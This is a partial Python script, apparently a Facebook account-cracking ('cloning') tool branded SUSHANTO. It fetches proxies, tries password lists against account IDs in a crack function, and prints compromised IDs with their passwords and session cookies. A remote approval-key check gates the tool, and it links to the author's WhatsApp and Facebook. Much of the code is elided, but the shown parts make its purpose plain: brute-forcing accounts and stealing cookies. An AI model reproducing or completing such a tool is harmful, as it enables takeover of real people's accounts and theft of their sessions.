...
try:
	...
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text	open('.prox.txt','w').write(prox)
...
os.system('espeak -a 300 " Welcome,   to,  SUSHANTO,  Tools"')

os.system('xdg-open https://www.facebook.com/maye.kol.3')
...
.d8888. db    db .d8888. db   db  .d8b.  d8b   db d888888b  .d88b.  

88'  YP 88    88 88'  YP 88   88 d8' `8b 888o  88 `~~88~~' .8P  Y8. 

`8bo.   88    88 `8bo.   88ooo88 88ooo88 88V8o 88    88    88    88 

  `Y8b. 88    88   `Y8b. 88~~~88 88~~~88 88 V8o88    88    88    88 

db   8D 88b  d88 db   8D 88   88 88   88 88  V888    88    `8b  d8' 

`8888Y' ~Y8888P' `8888Y' YP   YP YP   YP VP   V8P    YP     `Y88P']\033[0;92m

                                                                                                                           

╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗

║\33[0;41m        [ WORname ONLY MOBILE DATA ]         \033[0;92m║

╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 

╠══[Author                   • \33[1;38mMR-SUSHANTO ]\33[1;38m     ║\033[1;31m 

╠══[Facebook                 • SUSHANTO ║  \033[1;97m  

╠══[Github                   • \33[1;38mSUSHANTO ]   ║\33[1;34m   

╠══[Whatsapp                 • 0176******* ]  ║\33[1;35m 
...
def login():
	...
	if TUTUL in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801765141916')
...
def public():
	...
	try:
		...
		print(f' [] SUSHANTO ID: {P}'+str(len(id)))
...
def setting():
	...
	print('\x1b[1;92m LOGIN DONE\n\x1b[1;97m [1] DONE ✅')

	os.system('espeak -a 300 " 1,  method,  DONE"')
...
def passwrd():
	...
	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mSUSHANTO IDz :\033[0;97m '+str(len(id)))
	...
	SUSHANTO('CLONING COMPLETE .......... ')

	print(f'{h}[{h}💚{h}]{h} Your SUSHANTO OK idz : {h}%s '%(ok))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[SUSHANTO] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•SUSHANTO-CP] {idf} • {pw}')     
				...
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•SUSHANTO-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')

				print('\033[0;94m==============================================================')

				os.system('espeak -a 300 " SUSHANTO,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/SUSHANTO/Public-CloNing-42o/blob/main/Approval.txt").text
	...
	if key1 in r1:
		...
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Tutul name, ToOLs Daily Update")
		...
		os.system('am start https://wa.me/+8801765141916?text=' + tks)
